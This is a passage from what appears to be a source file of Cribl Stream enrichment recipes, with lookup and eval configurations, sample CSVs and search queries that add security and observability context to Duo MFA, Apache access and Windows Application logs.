        description: 'Enrich the device used for MFA against the managed device inventory to determine corporate management status, compliance, and ownership.',
        criblFunction: 'Lookup',
        addedFields: ['device_managed_status', 'device_compliance', 'device_owner'],
        securityValue: 'Identifies MFA approvals from unmanaged or non-compliant devices. An attacker using a personal phone to approve stolen credential push is flagged when the device is not in inventory.',
        observabilityValue: 'Tracks managed vs personal device MFA usage, supports device enrollment campaigns, and identifies users needing device upgrades.',
        personas: ['SOC', 'Identity Team', 'Endpoint Team', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'managed_device_inventory.csv',
            inputField: 'device_key → device_identifier',
            outputFields: ['device_managed_status', 'device_compliance', 'device_owner'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'device_identifier,managed_status,compliance,owner\nDP-IPHONE-001,managed,compliant,jsmith\nDP-ANDROID-002,managed,non-compliant,jdoe\nDP-IPHONE-003,unmanaged,unknown,unknown\nDP-PIXEL-004,managed,compliant,admin-bob\nDP-IPAD-005,unmanaged,unknown,contractor-jane',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: managed_device_inventory.csv\n// Input: device_key → device_identifier (exact match on Duo device key)\n// Output: managed_status → device_managed_status, compliance → device_compliance, owner → device_owner\n//\n// BEFORE: { user: "jsmith", device_key: "DP-IPHONE-003", factor: "Duo Push", result: "SUCCESS" }\n// AFTER:  { user: "jsmith", device_key: "DP-IPHONE-003", device_managed_status: "unmanaged", device_compliance: "unknown", device_owner: "unknown" }',
          notes: 'Correlate Duo device identifiers with MDM inventory (Intune, Jamf). Unmanaged devices approving MFA for privileged accounts should trigger immediate review.'
        }
      },
      {
        name: 'User Behavior Baseline Eval',
        description: 'Compare current MFA push frequency against the user\'s established baseline to detect push spam/fatigue attacks and anomalous authentication volumes.',
        criblFunction: 'Eval',
        addedFields: ['push_frequency_score', 'above_baseline'],
        securityValue: 'Detects MFA push spam/fatigue attacks where attackers repeatedly trigger pushes hoping the user will approve one. Frequency spikes above baseline indicate active credential compromise with push bombing.',
        observabilityValue: 'Tracks per-user MFA interaction rates, identifies users experiencing authentication friction, supports UX improvement for high-frequency authenticators.',
        personas: ['SOC', 'Security Engineering', 'Identity Team'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Calculate push frequency deviation from baseline',
            outputFields: ['push_frequency_score', 'above_baseline']
          },
          example: '// Cribl Stream → Processing → Eval Function (requires stateful context or Redis)\n// Step 1: Track push count per user in sliding 1-hour window (via Redis INCR or Aggregations)\n//   push_count_1h = Redis GET "duo_push:{user}:1h" || state.getUserPushCount(user, 3600)\n//\n// Step 2: Compare against baseline (from user_baselines lookup)\n//   push_frequency_score = push_count_1h / (baseline_push_per_hour || 1)\n//   above_baseline = push_frequency_score > 3.0 ? \'true\' : \'false\'\n//\n// BEFORE: { user: "jsmith", factor: "Duo Push", result: "DENIED" }\n// AFTER:  { user: "jsmith", factor: "Duo Push", result: "DENIED", push_frequency_score: 8.5, above_baseline: "true" }\n// Interpretation: 8.5x normal push rate → likely push spam attack',
          notes: 'Threshold of 3x baseline is recommended starting point. Users with above_baseline=true and result=DENIED are strong indicators of active push spam attacks. Alert immediately.'
        }
      },
      {
        name: 'Integration Criticality Lookup',
        description: 'Map the Duo integration (application) to its criticality tier, owning team, and data sensitivity classification from the integration inventory.',
        criblFunction: 'Lookup',
        addedFields: ['integration_tier', 'integration_owner', 'data_sensitivity'],
        securityValue: 'Enables priority-based alerting for MFA failures — a denied push on the VPN gateway (Tier-1) is more urgent than a denied push on an internal tool (Tier-3). Supports SLA-based response.',
        observabilityValue: 'Tracks MFA success rates per integration tier, identifies integrations with high failure rates needing configuration review, supports capacity planning.',
        personas: ['SOC', 'Identity Team', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'duo_integrations.csv',
            inputField: 'integration_key → integration_id',
            outputFields: ['integration_tier', 'integration_owner', 'data_sensitivity'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'integration_id,tier,owner,data_sensitivity\nDI-VPN-GLOBAL,Tier-1,network-ops,confidential\nDI-AWS-CONSOLE,Tier-1,cloud-ops,restricted\nDI-JIRA,Tier-2,devtools-team,internal\nDI-WIKI,Tier-3,it-support,public\nDI-PAYROLL,Tier-1,hr-systems,restricted',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: duo_integrations.csv\n// Input: integration_key → integration_id (exact match)\n// Output: tier → integration_tier, owner → integration_owner, data_sensitivity\n//\n// BEFORE: { user: "jsmith", integration_key: "DI-VPN-GLOBAL", result: "FRAUD" }\n// AFTER:  { user: "jsmith", integration_key: "DI-VPN-GLOBAL", integration_tier: "Tier-1", integration_owner: "network-ops", data_sensitivity: "confidential" }',
          notes: 'Export from Duo Admin API: GET /admin/v1/integrations. Map each integration to business criticality. Tier-1 failures should page on-call; Tier-3 failures create tickets.'
        }
      },
      {
        name: 'Auth Factor Strength Eval',
        description: 'Score the MFA factor used (Duo Push, phone call, SMS, hardware token, WebAuthn) by its resistance to phishing and interception attacks.',
        criblFunction: 'Eval',
        addedFields: ['factor_strength', 'factor_risk_level'],
        securityValue: 'Identifies users authenticating with weak factors susceptible to social engineering (phone callback, SMS). Enables detection of factor downgrade attacks where an attacker forces fallback to weaker methods.',
        observabilityValue: 'Tracks strong vs weak factor adoption rates across the organization. Supports migration initiatives from SMS/phone to push/WebAuthn by measuring progress.',
        personas: ['SOC', 'Identity Team', 'Security Engineering', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Score authentication factor by phishing resistance',
            outputFields: ['factor_strength', 'factor_risk_level']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// factor_strength = factor == \'WebAuthn\' || factor == \'U2F\' ? \'phishing-resistant\'\n//   : factor == \'Duo Push\' ? \'strong\'\n//   : factor == \'TOTP\' || factor == \'Hardware Token\' ? \'moderate\'\n//   : factor == \'Phone Call\' ? \'weak\'\n//   : factor == \'SMS\' ? \'vulnerable\' : \'unknown\'\n//\n// factor_risk_level = factor_strength == \'phishing-resistant\' ? \'low\'\n//   : factor_strength == \'strong\' ? \'low\'\n//   : factor_strength == \'moderate\' ? \'medium\'\n//   : factor_strength == \'weak\' ? \'high\'\n//   : factor_strength == \'vulnerable\' ? \'critical\' : \'unknown\'\n//\n// BEFORE: { user: "jsmith", factor: "SMS", result: "SUCCESS" }\n// AFTER:  { user: "jsmith", factor: "SMS", factor_strength: "vulnerable", factor_risk_level: "critical" }',
          notes: 'Align with NIST SP 800-63B: WebAuthn/U2F=AAL3 (phishing-resistant), Push/TOTP=AAL2, SMS/Phone=deprecated-AAL2. Alert on SMS usage for privileged accounts.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Push Spam Pattern Query',
        description: 'Identify users receiving an abnormal number of denied MFA pushes within a short window, indicating active push spam/fatigue attack campaigns.',
        criblFunction: 'Search-time lookup',
        addedFields: ['denied_push_count_1h', 'push_spam_indicator'],
        securityValue: 'Retrospective detection of push spam campaigns — identifies users who were targeted even if they did not ultimately approve a fraudulent push. Enables proactive credential resets.',
        personas: ['SOC', 'Incident Response', 'Threat Hunting'],
        implementation: {
          example: '// Cribl Search push spam detection:\n// dataset="duo_mfa_logs" result="DENIED" factor="Duo Push" earliest=-4h\n// | timestats span=1h denied_push_count_1h=count() by user\n// | extend push_spam_indicator = iif(denied_push_count_1h >= 5, \'confirmed\', iif(denied_push_count_1h >= 3, \'suspected\', \'normal\'))\n// | where push_spam_indicator != \'normal\'\n// | order by denied_push_count_1h desc',
          notes: 'Threshold: 5+ denied pushes in 1 hour = confirmed push spam. 3-4 = suspected. Correlate with Duo Fraud Report submissions for high-confidence alerting.'
        }
      },
      {
        name: 'Auth Failure Trending',
        description: 'Analyze MFA failure trends over a 7-day window to identify degrading authentication health, integration issues, or emerging attack patterns.',
        criblFunction: 'Search-time lookup',
        addedFields: ['failure_trend_direction', 'failure_rate_7d_avg'],
        securityValue: 'Rising failure trends across multiple users often indicate credential stuffing campaigns or configuration issues that attackers could exploit. Early warning before individual thresholds trigger.',
        personas: ['SOC', 'Identity Team', 'Security Engineering', 'SRE'],
        implementation: {
          example: '// Cribl Search failure trend analysis:\n// dataset="duo_mfa_logs" earliest=-7d\n// | timestats span=1d total=count(), failures=countif(result in ("DENIED", "FAILURE", "FRAUD")) by integration_key\n// | extend daily_failure_rate = round(failures * 100.0 / total, 2)\n// | summarize failure_rate_7d_avg=avg(daily_failure_rate), trend_start=min(daily_failure_rate), trend_end=max(daily_failure_rate) by integration_key\n// | extend failure_trend_direction = iif(trend_end > trend_start * 1.5, \'increasing\', iif(trend_end < trend_start * 0.5, \'decreasing\', \'stable\'))\n// | where failure_trend_direction == \'increasing\'\n// | order by failure_rate_7d_avg desc',
          notes: 'Run daily as a scheduled search. Increasing failure trends on specific integrations may indicate: 1) misconfiguration, 2) credential stuffing campaign, or 3) user experience issue needing attention.'
        }
      }
    ]
  },
  'apache-access': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to the client IP (remote_addr or first entry in x_forwarded_for) for traffic origin analysis and geo-based threat detection.',
        criblFunction: 'GeoIP',
        addedFields: ['client_country', 'client_city', 'client_asn', 'client_org'],
        securityValue: 'Identifies attack traffic origin by country and ASN, enables geographic blocking recommendations, and supports impossible travel detection for authenticated web applications.',
        observabilityValue: 'Enables geographic traffic distribution dashboards, identifies which regions drive the most load, supports CDN placement and edge caching decisions.',
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'remote_addr (or x_forwarded_for first entry)',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputFields: ['client_country', 'client_city', 'client_asn', 'client_org']
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Pre-Eval: true_client_ip = x_forwarded_for ? x_forwarded_for.split(\',\')[0].trim() : remote_addr\n// Input Field: true_client_ip\n// Output Fields: client_country, client_city, client_asn, client_org\n//\n// BEFORE: { remote_addr: "172.16.0.1", x_forwarded_for: "198.51.100.42, 10.0.0.1" }\n// AFTER:  { remote_addr: "172.16.0.1", x_forwarded_for: "198.51.100.42, 10.0.0.1",\n//           client_country: "US", client_city: "San Jose", client_asn: "AS16509", client_org: "Amazon.com Inc" }',
          notes: 'When behind a reverse proxy or load balancer, always use the first IP in X-Forwarded-For (the true client). The remote_addr will be the proxy IP. Validate X-Forwarded-For is not spoofed by checking trusted proxy ranges.'
        }
      },
      {
        name: 'Bot Classification Lookup',
        description: 'Classify HTTP user agent strings against a known bot/crawler database to distinguish legitimate crawlers, malicious bots, and human traffic.',
        criblFunction: 'Lookup',
        addedFields: ['bot_category', 'bot_name', 'is_bot'],
        securityValue: 'Immediately identifies malicious bots (scrapers, credential stuffers, vulnerability scanners) vs legitimate crawlers (Googlebot, Bingbot). Enables bot-aware detection rules without complex user-agent parsing downstream.',
        observabilityValue: 'Enables accurate human vs bot traffic split for capacity planning, identifies bot traffic consuming disproportionate resources, and supports SEO monitoring for crawler access patterns.',
        personas: ['Security Engineering', 'SOC', 'SRE', 'Application Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'bot_signatures.csv',
            inputField: 'user_agent → ua_pattern (regex match)',
            outputFields: ['bot_category', 'bot_name', 'is_bot'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'ua_pattern,bot_category,bot_name,is_bot\n.*Googlebot.*,search-engine,Googlebot,true\n.*Bingbot.*,search-engine,Bingbot,true\n.*python-requests.*,automation,python-requests,true\n.*sqlmap.*,scanner,sqlmap,true\n.*Go-http-client.*,automation,Go-http-client,true',
          example: '// Cribl Stream → Processing → Lookup Function (regex match mode)\n// Lookup File: bot_signatures.csv\n// Input: user_agent → ua_pattern (regex match)\n// Output: bot_category, bot_name, is_bot\n//\n// Add Eval fallback: is_bot = is_bot || \'false\'; bot_category = bot_category || \'human\'\n//\n// BEFORE: { user_agent: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" }\n// AFTER:  { user_agent: "Mozilla/5.0 (compatible; Googlebot/2.1; ...)", bot_category: "search-engine", bot_name: "Googlebot", is_bot: "true" }',
          notes: 'Verify legitimate crawlers by reverse DNS (Googlebot should resolve to *.googlebot.com). Spoof detection: if bot_name=Googlebot but IP does not match Google ranges, flag as impersonator.'
        }
      },
      {
        name: 'Application Route Lookup',
        description: 'Map request URI paths to the backend service, owning team, and service tier using a URI prefix-to-service mapping table.',
        criblFunction: 'Lookup',
        addedFields: ['service_name', 'service_team', 'service_tier'],
        securityValue: 'Enables service-aware attack detection — SQL injection targeting /api/payments (Tier-1) is critical while the same pattern on /api/health (Tier-3) is low priority. Routes security alerts to the correct team.',
        observabilityValue: 'Enables per-service request rate, error rate, and latency dashboards without application-level instrumentation. Supports SLO tracking by service tier.',
        personas: ['SRE', 'Platform Engineering', 'Application Team', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'uri_service_map.csv',
            inputField: 'request_uri → uri_prefix (prefix match)',
            outputFields: ['service_name', 'service_team', 'service_tier'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'uri_prefix,service_name,service_team,service_tier\n/api/payments,payment-service,commerce-team,Tier-1\n/api/users,user-service,platform-team,Tier-1\n/api/health,health-check,sre-team,Tier-3\n/static/,cdn-origin,platform-team,Tier-3\n/admin/,admin-portal,security-team,Tier-2',
          example: '// Cribl Stream → Processing → Lookup Function (prefix match)\n// Lookup File: uri_service_map.csv\n// Input: request_uri → uri_prefix (longest prefix match)\n// Output: service_name, service_team, service_tier\n//\n// BEFORE: { request_uri: "/api/payments/charge?amount=100", method: "POST", status: 200 }\n// AFTER:  { request_uri: "/api/payments/charge?amount=100", service_name: "payment-service", service_team: "commerce-team", service_tier: "Tier-1" }',
          notes: 'Use longest prefix match for accurate routing. Generate from Apache VirtualHost/Location configs or reverse proxy route tables. Update when new services are deployed.'
        }
      },
      {
        name: 'Response Time Bucketing Eval',
        description: 'Classify request response time (request_time or duration) into latency buckets and flag slow requests for SLO tracking and performance alerting.',
        criblFunction: 'Eval',
        addedFields: ['latency_bucket', 'is_slow_request'],
        securityValue: 'Unusually slow requests may indicate resource exhaustion attacks (ReDoS, slow loris) or backend compromise causing processing delays. Slow responses on authentication endpoints may signal brute force load.',
        observabilityValue: 'Foundation for Apdex scoring and SLO compliance. Enables latency distribution analysis, identifies degrading endpoints before users complain, and supports capacity scaling triggers.',
        personas: ['SRE', 'Platform Engineering', 'Application Team', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Classify response_time_ms into latency buckets',
            outputFields: ['latency_bucket', 'is_slow_request']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// latency_bucket = response_time_ms < 100 ? \'fast\'\n//   : response_time_ms < 500 ? \'normal\'\n//   : response_time_ms < 2000 ? \'slow\'\n//   : response_time_ms < 10000 ? \'very_slow\' : \'timeout\'\n//\n// is_slow_request = response_time_ms > 2000 ? \'true\' : \'false\'\n//\n// Note: Apache logs request_time in microseconds — convert first:\n// response_time_ms = Math.round(request_time / 1000)\n//\n// BEFORE: { request_uri: "/api/search", request_time: 3500000, status: 200 }\n// AFTER:  { request_uri: "/api/search", response_time_ms: 3500, latency_bucket: "very_slow", is_slow_request: "true" }',
          notes: 'Apache %D is microseconds, %T is seconds. Convert to milliseconds for consistent bucketing. Thresholds should align with your SLO targets (e.g., p99 < 2s for Tier-1 services).'
        }
      },
      {
        name: 'IP Reputation Lookup',
        description: 'Enrich client IP against aggregated threat intelligence feeds to identify known malicious actors, scanners, and attack infrastructure.',
        criblFunction: 'Lookup',
        addedFields: ['threat_category', 'threat_score', 'is_known_malicious'],
        securityValue: 'Tags requests from known-bad infrastructure at the pipeline level. Enables immediate alerting on attacks from confirmed threat actors without waiting for behavioral analysis. Reduces time-to-detect for known threats to zero.',
        observabilityValue: 'Supports "malicious request volume" dashboards and threat source trending. Identifies which threat categories target your applications most frequently.',
        personas: ['SOC', 'Security Engineering', 'Application Team', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'ip_threat_intel.csv',
            inputField: 'true_client_ip → indicator',
            outputFields: ['threat_category', 'threat_score', 'is_known_malicious'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'indicator,threat_category,threat_score,is_known_malicious\n198.51.100.1,scanner,70,true\n203.0.113.50,brute-force,85,true\n192.0.2.100,botnet,90,true\n185.220.101.1,tor-exit,60,true\n104.244.77.100,credential-stuffing,80,true',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: ip_threat_intel.csv\n// Input: true_client_ip → indicator (exact match)\n// Output: threat_category, threat_score, is_known_malicious\n//\n// Add Eval default: is_known_malicious = is_known_malicious || \'false\'; threat_score = threat_score || 0\n//\n// BEFORE: { remote_addr: "203.0.113.50", request_uri: "/wp-login.php", method: "POST" }\n// AFTER:  { remote_addr: "203.0.113.50", threat_category: "brute-force", threat_score: 85, is_known_malicious: "true" }',
          notes: 'Aggregate from AbuseIPDB, Emerging Threats, AlienVault OTX, and internal honeypot data. Refresh every 15 minutes. Same threat intel CSV can be shared across all IP-based enrichments.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Historical Request Pattern',
        description: 'Compare current request rates against pre-computed hourly baselines to identify traffic anomalies, DDoS indicators, or sudden popularity spikes.',
        criblFunction: 'Search-time lookup',
        addedFields: ['baseline_rps', 'deviation_factor'],
        securityValue: 'Identifies DDoS attacks and application-layer flooding by comparing current request volume against historical norms. A 10x deviation from baseline on a specific endpoint indicates targeted attack.',
        personas: ['SOC', 'SRE', 'Security Engineering', 'NOC'],
        implementation: {
          example: '// Cribl Search baseline comparison:\n// dataset="apache_access_logs" earliest=-1h\n// | timestats span=5m current_rps=count() by service_name\n// | lookup request_baselines.csv on service_name=service, hour_of_day=strftime(timestamp, "%H") output avg_rps as baseline_rps\n// | extend deviation_factor = round(current_rps / baseline_rps, 2)\n// | where deviation_factor > 5.0 or deviation_factor < 0.1\n// | order by deviation_factor desc',
          notes: 'Baselines computed per service per hour-of-day to account for daily traffic patterns. Deviation > 5x = likely attack or viral event. Deviation < 0.1x = possible outage upstream.'
        }
      },
      {
        name: 'Error Correlation Query',
        description: 'Correlate 5xx error spikes with upstream service health and recent deployments to identify root cause of error cascades.',
        criblFunction: 'Search-time lookup',
        addedFields: ['related_5xx_count', 'upstream_error_indicator'],
        securityValue: 'Distinguishes between attack-induced errors (targeted DoS causing 503s) and infrastructure failures. If 5xx errors correlate with upstream health degradation, it is infra; if not, investigate for attack.',
        personas: ['SRE', 'NOC', 'Platform Engineering', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search error correlation:\n// dataset="apache_access_logs" status >= 500 earliest=-2h\n// | timestats span=5m related_5xx_count=count() by service_name\n// | join kind=left (\n//     dataset="upstream_health_checks" earliest=-2h\n//     | where status == "unhealthy"\n//     | summarize unhealthy_checks=count() by service_name\n//   ) on service_name\n// | extend upstream_error_indicator = iif(unhealthy_checks > 0, \'upstream_degraded\', \'origin_issue\')\n// | where related_5xx_count > 10\n// | order by related_5xx_count desc',
          notes: 'Cross-reference with deployment events and upstream health checks. If upstream_error_indicator=upstream_degraded, the issue is backend infrastructure. If origin_issue, investigate Apache config or attack patterns.'
        }
      }
    ]
  },
  'windows-application': {
    streamTime: [
      {
        name: 'Application Criticality Lookup',
        description: 'Map application source name to business tier, owner, and impact level using a curated CSV of enterprise applications.',
        criblFunction: 'Lookup',
        addedFields: ['app_tier', 'app_owner', 'business_impact', 'support_team'],
        securityValue: 'Enables alert prioritization based on application business value — errors in Tier-1 apps trigger immediate escalation while Tier-3 app errors follow standard workflow.',
        observabilityValue: 'Supports SLA tracking by business tier, enables cost attribution for application support, and drives capacity planning per application owner.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'app_criticality.csv',
            inputField: 'SourceName → app_name',
            outputFields: ['app_tier', 'app_owner', 'business_impact', 'support_team'],
            reloadInterval: '6 hours'
          },
          lookupSample: 'app_name,app_tier,app_owner,business_impact,support_team\nSQLServer,Tier-1,DBA Team,revenue-critical,database-ops\nIIS,Tier-1,Web Platform,customer-facing,web-ops\nMSExchange,Tier-2,Messaging Team,productivity,messaging-ops\nPrint Spooler,Tier-3,Desktop Support,low,desktop-support',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: app_criticality.csv\n// Input: SourceName → app_name (exact match)\n// Output: app_tier, app_owner, business_impact, support_team\n//\n// BEFORE: { SourceName: "SQLServer", EventID: 18456, Message: "Login failed" }\n// AFTER:  { SourceName: "SQLServer", EventID: 18456, app_tier: "Tier-1", app_owner: "DBA Team", business_impact: "revenue-critical", support_team: "database-ops" }',
          notes: 'Maintain via ServiceNow CMDB export. Update when applications are promoted/demoted between tiers or ownership changes. Tier-1 apps should trigger PagerDuty integration.'
        }
      },
      {
        name: 'Error Pattern Classification',
        description: 'Classify application log events by source and event ID into error categories, known issue status, and noise level for alert routing.',
        criblFunction: 'Eval',
        addedFields: ['error_category', 'is_known_issue', 'noise_level'],
        securityValue: 'Filters known benign errors from novel failures, reducing alert fatigue. Unknown error patterns surface faster when known noise is pre-classified.',
        observabilityValue: 'Enables noise-level-based routing — high-noise known issues go to cold storage while novel errors route to active monitoring dashboards.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Classify by SourceName + EventID combination',
            outputFields: ['error_category', 'is_known_issue', 'noise_level']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// error_category = (SourceName==\'SQLServer\' && EventID==18456) ? \'authentication-failure\'\n//   : (SourceName==\'IIS\' && EventID==5011) ? \'app-pool-crash\'\n//   : (SourceName==\'.NET Runtime\' && EventID==1026) ? \'unhandled-exception\'\n//   : (SourceName==\'Windows Error Reporting\' && EventID==1001) ? \'application-crash\'\n//   : \'uncategorized\'\n//\n// is_known_issue = (SourceName==\'SQLServer\' && EventID==18456 && Message.includes(\'NT AUTHORITY\')) ? \'true\'\n//   : (SourceName==\'IIS\' && EventID==5011 && Message.includes(\'DefaultAppPool\')) ? \'true\' : \'false\'\n//\n// noise_level = is_known_issue==\'true\' ? \'high\' : error_category==\'uncategorized\' ? \'low\' : \'medium\'\n//\n// BEFORE: { SourceName: "SQLServer", EventID: 18456, Message: "Login failed for user NT AUTHORITY\\\\SYSTEM" }\n// AFTER:  { ..., error_category: "authentication-failure", is_known_issue: "true", noise_level: "high" }',
          notes: 'Expand classification rules as new patterns emerge. Start with the top 20 noisiest EventID/Source combinations and classify outward. Review monthly for new known issues.'
        }
      },
      {
        name: 'Known Issue Lookup',
        description: 'Map error codes and event IDs to internal knowledge base articles, resolution status, and workaround availability.',
        criblFunction: 'Lookup',
        addedFields: ['kb_article', 'resolution_status', 'workaround_available'],
        securityValue: 'Accelerates triage by immediately linking errors to known remediation. Analysts skip redundant investigation for documented issues.',
        observabilityValue: 'Tracks recurrence of known issues across the fleet — identifies hosts that missed patches or workarounds.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'known_issues.csv',
            inputField: 'EventID → event_id',
            outputFields: ['kb_article', 'resolution_status', 'workaround_available'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'event_id,source_name,kb_article,resolution_status,workaround_available\n18456,SQLServer,KB-2024-0891,resolved-in-patch,true\n5011,IIS,KB-2024-1102,workaround-only,true\n1026,.NET Runtime,KB-2025-0045,investigating,false\n1001,Windows Error Reporting,KB-2024-0567,resolved-in-patch,true',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: known_issues.csv\n// Input: EventID → event_id (+ SourceName → source_name for compound key)\n// Output: kb_article, resolution_status, workaround_available\n//\n// BEFORE: { SourceName: "IIS", EventID: 5011, Message: "A process serving application pool DefaultAppPool terminated unexpectedly" }\n// AFTER:  { ..., kb_article: "KB-2024-1102", resolution_status: "workaround-only", workaround_available: "true" }',
          notes: 'Source from internal ServiceNow knowledge base or Confluence. Use compound key (EventID + SourceName) for precise matching. Update when patches are released.'
        }
      },
      {
        name: 'Module Reputation Lookup',
        description: 'Enrich faulting module names and versions against a curated reputation database to identify known vulnerable or suspicious modules.',
        criblFunction: 'Lookup',
        addedFields: ['module_reputation', 'is_known_vulnerable', 'cve_id'],
        securityValue: 'Identifies crashes caused by known vulnerable DLLs or modules. A crash in a module with active CVEs may indicate exploitation rather than a benign bug.',
        observabilityValue: 'Tracks which modules cause the most crashes fleet-wide, enabling targeted patching and vendor engagement for problematic dependencies.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'module_reputation.csv',
            inputField: 'FaultingModuleName → module_name',
            outputFields: ['module_reputation', 'is_known_vulnerable', 'cve_id'],
            reloadInterval: '12 hours'
          },
          lookupSample: 'module_name,module_version,module_reputation,is_known_vulnerable,cve_id\nntdll.dll,10.0.19041.1,trusted,false,\nmshtml.dll,11.0.19041.1,vulnerable,true,CVE-2024-38112\noleaut32.dll,10.0.19041.1,trusted,false,\nvcruntime140.dll,14.29.30139.0,outdated,true,CVE-2023-36049',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: module_reputation.csv\n// Input: FaultingModuleName → module_name\n// Output: module_reputation, is_known_vulnerable, cve_id\n//\n// BEFORE: { SourceName: "Application Error", EventID: 1000, FaultingModuleName: "mshtml.dll", FaultingModuleVersion: "11.0.19041.1" }\n// AFTER:  { ..., module_reputation: "vulnerable", is_known_vulnerable: "true", cve_id: "CVE-2024-38112" }',
          notes: 'Populate from NVD/CVE feeds filtered to Windows DLLs. Cross-reference with your software inventory to identify modules present in your environment. Update after Patch Tuesday.'
        }
      },
      {
        name: 'Environment Tagging',
        description: 'Derive environment, datacenter, and application cluster from the computer name using naming convention patterns.',
        criblFunction: 'Eval',
        addedFields: ['environment', 'datacenter', 'app_cluster'],
        securityValue: 'Enables environment-scoped alerting — production application errors are higher priority than dev/staging. Supports blast radius assessment during incidents.',
        observabilityValue: 'Powers environment-level health dashboards, enables cross-datacenter comparison, and supports capacity planning per cluster.',
        personas: ['SOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expression: 'Parse computer name convention to extract environment metadata',
            outputFields: ['environment', 'datacenter', 'app_cluster']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Assumes naming convention: {APP}-{ENV}-{DC}-{NUM} (e.g., SQL-PROD-DC1-01)\n// Expressions:\n// const parts = ComputerName.split(\'-\');\n// environment = parts[1] == \'PROD\' ? \'production\'\n//   : parts[1] == \'STG\' ? \'staging\'\n//   : parts[1] == \'DEV\' ? \'development\' : \'unknown\'\n//\n// datacenter = parts[2] || \'unknown\'\n// app_cluster = parts[0] || \'unknown\'\n//\n// BEFORE: { ComputerName: "SQL-PROD-DC1-01", SourceName: "SQLServer", EventID: 18456 }\n// AFTER:  { ..., environment: "production", datacenter: "DC1", app_cluster: "SQL" }',
          notes: 'Adapt the parsing logic to match your organization\'s host naming convention. If naming is inconsistent, fall back to a Lookup table mapping hostnames to environments.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Crash Frequency Analysis',
        description: 'At investigation time, calculate crash frequency per application over the last 24 hours and determine if the trend is increasing or decreasing.',
        criblFunction: 'Search-time lookup',
        addedFields: ['crash_count_24h', 'crash_trend_direction'],
        securityValue: 'A sudden spike in crash frequency for a single application may indicate active exploitation or payload delivery causing instability.',
        observabilityValue: 'Identifies applications with degrading stability for proactive maintenance. Trending crashes trigger pre-emptive remediation before user impact.',
        personas: ['SOC', 'SRE'],
        implementation: {
          example: '// Cribl Search crash frequency analysis:\n// dataset="windows_application" EventID in (1000, 1001, 1026) earliest=-24h\n// | summarize crash_count_24h=count() by SourceName, ComputerName\n// | join kind=left (\n//     dataset="windows_application" EventID in (1000, 1001, 1026) earliest=-48h latest=-24h\n//     | summarize prev_count=count() by SourceName, ComputerName\n//   ) on SourceName, ComputerName\n// | extend crash_trend_direction = iif(crash_count_24h > prev_count * 1.5, \'increasing\', iif(crash_count_24h < prev_count * 0.5, \'decreasing\', \'stable\'))\n// | where crash_count_24h > 5\n// | order by crash_count_24h desc',
          notes: 'Compare current 24h window against previous 24h to determine trend. An "increasing" trend with >50% growth warrants investigation. Filter low-count noise with threshold.'
        }
      },
      {
        name: 'Error Rate Baseline',
        description: 'Compare current error rates against historical baselines to identify statistically significant deviations per application.',
        criblFunction: 'Search-time lookup',
        addedFields: ['baseline_error_rate', 'current_deviation_pct'],
        securityValue: 'Distinguishes normal background error rates from anomalous spikes that may indicate attacks, configuration changes, or emerging failures.',
        observabilityValue: 'Provides context for on-call engineers — "is this error rate normal?" is answered quantitatively rather than relying on tribal knowledge.',
        personas: ['SOC', 'SRE'],
        implementation: {
          example: '// Cribl Search baseline comparison:\n// dataset="windows_application" Level=="Error" earliest=-1h\n// | summarize current_rate=count() by SourceName, bin(timestamp, 5m)\n// | join kind=left (\n//     dataset="app_error_baselines"\n//     | where day_of_week == dayofweek(now()) and hour_bucket == hourofday(now())\n//     | project SourceName, baseline_error_rate=avg_errors_per_5m\n//   ) on SourceName\n// | extend current_deviation_pct = round((current_rate - baseline_error_rate) / baseline_error_rate * 100, 1)\n// | where current_deviation_pct > 200\n// | order by current_deviation_pct desc',
          notes: 'Requires pre-computed baselines (avg errors per 5-min window by hour-of-day and day-of-week). Compute weekly via scheduled job. A >200% deviation is typically actionable.'
        }
      }
    ]
  },
  'windows-sysmon': {
    streamTime: [
      {
        name: 'Process Reputation Lookup',
